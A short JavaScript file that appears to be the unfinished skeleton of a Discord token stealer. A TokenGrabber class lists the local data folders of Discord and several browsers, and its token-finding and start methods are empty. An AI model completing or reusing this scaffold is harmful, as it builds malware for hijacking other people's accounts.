class TokenGrabber {
    constructor() {
        this.paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }

    async findTokens(tPath) {

    }

    async start() {
        
    }
}

module.exports = TokenGrabber